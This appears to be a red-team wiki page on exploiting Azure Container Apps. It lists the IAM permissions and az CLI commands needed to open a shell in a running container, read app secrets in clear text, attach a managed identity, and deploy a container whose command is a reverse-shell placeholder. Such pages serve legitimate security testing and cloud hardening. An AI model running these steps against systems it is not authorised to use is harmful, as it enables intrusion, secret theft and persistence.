---
title: "Azure Container Apps Explotation"
order: 132
description: Explotation of Azure Container Apps
---

## Get a shell

> The following permissions are required:
> - **Microsoft.App/containerApps/read**
> - **Microsoft.App/managedEnvironments/read**
> - **Microsoft.app/containerapps/revisions/replicas**
> - **Microsoft.App/containerApps/revisions/read**
> - **Microsoft.App/containerApps/getAuthToken/action**
>
> These permissions allow the user to get a shell in a runningapplication container. 

```bash
az containerapp exec --name <app-name> --resource-group <res-group> --command "sh"
az containerapp debug --name <app-name> --resource-group <res-group>
```

## Get Secrets in clear text

> The permission needed is:
> - **Microsoft.App/containerApps/listSecrets/action**
>
> This permission allows to get the clear text of the secrets configured inside a container app. Note that secrets can be configured with the clear text of with a link to a key vault.

```bash
az containerapp secret list --name <app-name> --resource-group <res-group>
```

```bash
az containerapp secret show --name <app-name> --resource-group <res-group> --secret-name <scret-name>
```

## Attach MI

> The following permission are required:
> - **Microsoft.App/containerApps/write**
> - **Microsoft.ManagedIdentity/userAssignedIdentities/assign/action**
>
> These permissions allows to attach a user managed identity to a container app. Executing this action from the az cli also requires the permission
> - **Microsoft.App/containerApps/listSecrets/action**

```bash
az containerapp identity assign -n <app-name> -g <res-group> --user-assigned myUserIdentityName
```

## Create/Update application container

> The permissions required are:
> - **Microsoft.App/containerApps/write**
> - **Microsoft.ManagedIdentity/userAssignedIdentities/assign/action**
> - **Microsoft.App/managedEnvironments/join/action**

Get enviroments

```bash
az containerapp env list --resource-group Resource_Group_1
```

Create app in a an environment

```bash
az containerapp create \
  --name <app-name> \
  --resource-group <res-group> \
  --image mcr.microsoft.com/oss/nginx/nginx:1.9.15-alpine \
  --cpu 1 --memory 1.0 \
  --user-assigned <user-asigned-identity-name> \
  --min-replicas 1 \
  --command "<reserse shell>"
```